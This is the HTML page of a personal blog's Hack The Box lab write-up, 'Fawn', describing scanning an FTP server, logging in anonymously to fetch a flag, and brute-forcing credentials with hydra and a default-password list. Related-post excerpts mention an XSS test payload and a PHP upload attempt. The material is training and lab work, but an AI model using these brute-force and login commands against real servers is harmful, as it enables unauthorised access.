@@ -1,0 +1,732 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>[ HTB ] - Fawn - A1mH1gh</title>
+<meta name="description" content="Fawn Server offers FTP service, But Insecure Default setting and Passwrod complexity are the Attack Point. Now Let’s beggin  Refer down below link  https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp    1. RECONNAISSANCE Gather Victim Network Information nmap -sS -sV 10.129.154.45   FTP Service open   2. Initial Access External Remote Services - FTP Service ftp 10.129.154.45   ftp server asks us credentials, 2 methods are available here.   3. Credential Access FTP Services basically offer Anonymous Login or we can try Brute Forcing. Anonymous Login Name     : anonymous Password : (blnak)   ls get flag.txt     Brute Force hydra is a tool which help us to run Brute Forcing. Not only hydra, but also ncrack, medusa, metasploit available hydra -L usernames.txt -P passwords.txt ftp://10.129.154.45   u can download passwords.txt here https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt  Name     : ftp Password : nas   Done.   Mitigations Disable anonymous login  Strong password security policy">
+
+
+  <meta name="author" content="A1mH1gh">
+  
+  <meta property="article:author" content="A1mH1gh">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="A1mH1gh">
+<meta property="og:title" content="[ HTB ] - Fawn">
+<meta property="og:url" content="http://localhost:4000/htb_writeup/HTB-Fawn/">
+
+
+  <meta property="og:description" content="Fawn Server offers FTP service, But Insecure Default setting and Passwrod complexity are the Attack Point. Now Let’s beggin  Refer down below link  https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp    1. RECONNAISSANCE Gather Victim Network Information nmap -sS -sV 10.129.154.45   FTP Service open   2. Initial Access External Remote Services - FTP Service ftp 10.129.154.45   ftp server asks us credentials, 2 methods are available here.   3. Credential Access FTP Services basically offer Anonymous Login or we can try Brute Forcing. Anonymous Login Name     : anonymous Password : (blnak)   ls get flag.txt     Brute Force hydra is a tool which help us to run Brute Forcing. Not only hydra, but also ncrack, medusa, metasploit available hydra -L usernames.txt -P passwords.txt ftp://10.129.154.45   u can download passwords.txt here https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt  Name     : ftp Password : nas   Done.   Mitigations Disable anonymous login  Strong password security policy">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-09-24T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb_writeup/HTB-Fawn/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "A1mH1gh",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="A1mH1gh Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          A1mH1gh
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/HTB_Writeup/">HTB Writeup</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/VulnWebs_Writeup/">VulnWebs Writeup</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4000/">
+        <img src="/assets/img/bow.png" alt="A1mH1gh" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">A1mH1gh</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Pentesting Log</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Republic of Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:A1mH1gh4909@gmail.com" rel="me" class="u-email">
+            <meta itemprop="email" content="A1mH1gh4909@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="[ HTB ] - Fawn">
+    <meta itemprop="description" content="Fawn Server offers FTP service, But Insecure Default setting and Passwrod complexity are the Attack Point. Now Let’s begginRefer down below linkhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp1. RECONNAISSANCEGather Victim Network Informationnmap -sS -sV 10.129.154.45FTP Service open2. Initial AccessExternal Remote Services - FTP Serviceftp 10.129.154.45ftp server asks us credentials, 2 methods are available here.3. Credential AccessFTP Services basically offer Anonymous Login or we can try Brute Forcing.Anonymous LoginName     : anonymousPassword : (blnak)lsget flag.txtBrute Forcehydra is a tool which help us to run Brute Forcing.Not only hydra, but also ncrack, medusa, metasploit availablehydra -L usernames.txt -P passwords.txt ftp://10.129.154.45u can download passwords.txt herehttps://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txtName     : ftpPassword : nasDone.MitigationsDisable anonymous loginStrong password security policy">
+    <meta itemprop="datePublished" content="2022-09-24T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4000/htb_writeup/HTB-Fawn/" class="u-url" itemprop="url">[ HTB ] - Fawn
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#1-reconnaissance">1. RECONNAISSANCE</a><ul><li><a href="#gather-victim-network-information">Gather Victim Network Information</a></li></ul></li><li><a href="#2-initial-access">2. Initial Access</a><ul><li><a href="#external-remote-services---ftp-service">External Remote Services - FTP Service</a></li></ul></li><li><a href="#3-credential-access">3. Credential Access</a><ul><li><a href="#anonymous-login">Anonymous Login</a></li><li><a href="#brute-force">Brute Force</a></li></ul></li><li><a href="#mitigations">Mitigations</a></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p><img src="https://user-images.githubusercontent.com/100695923/192085809-cd3e59fa-d9a7-4c0a-8dd1-1a6b9da28c09.png" alt="image" />
+Fawn Server offers FTP service, But Insecure Default setting and Passwrod complexity are the Attack Point. Now Let’s beggin</p>
+
+<p>Refer down below link
+<br />
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
+<br />
+<br /></p>
+
+<h1 id="1-reconnaissance">1. RECONNAISSANCE</h1>
+<h2 id="gather-victim-network-information">Gather Victim Network Information</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sS -sV 10.129.154.45
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/192085988-736a8e1e-0de6-46c9-a69b-ebf66491badd.png" alt="image" />
+FTP Service open
+<br />
+<br /></p>
+<h1 id="2-initial-access">2. Initial Access</h1>
+<h2 id="external-remote-services---ftp-service">External Remote Services - FTP Service</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.154.45
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/192086089-9a07e3b2-c38e-497f-a826-6566c6e82a9e.png" alt="image" />
+ftp server asks us credentials, 2 methods are available here.
+<br />
+<br /></p>
+<h1 id="3-credential-access">3. Credential Access</h1>
+<p>FTP Services basically offer <strong>Anonymous Login</strong> or we can try <strong>Brute Forcing</strong>.</p>
+<h2 id="anonymous-login">Anonymous Login</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name     : anonymous
+Password : (blnak)
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/192089117-bb44a4c1-b1a1-4015-b2c7-1a928c4eb3ae.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
+get flag.txt
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/192089377-3ecb324d-2c2c-462a-9646-8f0fa9402bde.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/192088419-92c5431f-f461-4184-9f57-cf652ec6ed38.png" alt="image" /></p>
+
+<h2 id="brute-force">Brute Force</h2>
+<p><strong>hydra</strong> is a tool which help us to run Brute Forcing.
+<br />Not only hydra, but also ncrack, medusa, metasploit available</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L usernames.txt -P passwords.txt ftp://10.129.154.45
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/192087704-f606202c-497e-4cf0-8a03-fb707ad8b8c6.png" alt="image" />
+u can download <strong>passwords.txt</strong> here
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+<br /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name     : ftp
+Password : nas
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/192089433-09be2658-ad72-45b2-ab38-e87b108970db.png" alt="image" />
+Done.
+<br />
+<br /></p>
+<h1 id="mitigations">Mitigations</h1>
+<p>Disable anonymous login
+<br />
+Strong password security policy</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#anonymouse-login" class="page__taxonomy-item p-category" rel="tag">anonymouse login</a><span class="sep">, </span>
+    
+      <a href="/tags/#ftp" class="page__taxonomy-item p-category" rel="tag">ftp</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#htb-writeup" class="page__taxonomy-item p-category" rel="tag">HTB_Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-09-24T00:00:00+09:00">September 24, 2022</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%5B+HTB+%5D+-+Fawn%20http%3A%2F%2Flocalhost%3A4000%2Fhtb_writeup%2FHTB-Fawn%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhtb_writeup%2FHTB-Fawn%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhtb_writeup%2FHTB-Fawn%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb_writeup/HTB-RedPanda/" class="pagination--pager" title="[ HTB ] - RedPanda
+">Previous</a>
+    
+    
+      <a href="/htb_writeup/HTB-Meow/" class="pagination--pager" title="[ HTB ] - Meow
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-x.x.137.97/" rel="permalink">[ VulnWebs ] - x.x.137.97
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">RECON
+
+OS: CentOS
+WAS: Apache/2.4.6
+Lang: PHP/7.2.34
+
+File Upload
+업로드 페이지가 존재하며
+http://x.x.137.97/upload.php
+
+
+
+확장자 ‘.php’를 가지는 php코드 파일을 업로드 시도
+import reque...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/" rel="permalink">[ VulnWebs ] - testhtml5.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+WAS: Nginx/1.19.0
+
+
+XSS
+
+로그인 페이지에서
+http://testhtml5.vulnweb.com/#/popular
+
+스크립트 구문으로 로그인 하면
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+
+...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/" rel="permalink">[ VulnWebs ] - testaspnet.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+OS: Windows Server
+WAS: IIS/8.5
+Lang: ASP.NET
+
+
+
+
+Information Leakage
+서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음
+http://testaspnet.vulnwe...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/" rel="permalink">[ VulnWebs ] - testasp.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+
+OS: Windows Server
+WAS: Microsoft-IIS/8.5
+Lang: ASP.NET
+
+Information Leakage
+임의값을 전송하여 서버 에러를 유발시켜 서버 정보를 노출시킴
+http://testasp.vulnweb.com/showfor...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 A1mH1gh. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
